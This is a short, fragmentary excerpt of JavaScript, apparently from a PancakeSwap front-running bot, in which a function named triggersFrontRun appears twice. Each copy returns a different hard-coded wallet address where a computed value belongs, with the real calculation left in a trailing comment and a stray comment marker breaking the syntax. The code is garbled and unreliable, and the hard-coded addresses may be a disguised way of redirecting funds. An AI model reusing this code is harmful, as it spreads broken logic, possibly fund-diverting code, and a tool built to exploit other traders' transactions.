...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		...
		return 0xAfa3e8CfB87ee77d8778FE12aF0eF84388Db6281;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput,*/
		return 0x7f60c1EDA260Cd6dDF70527fEb081f740E3d3702;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
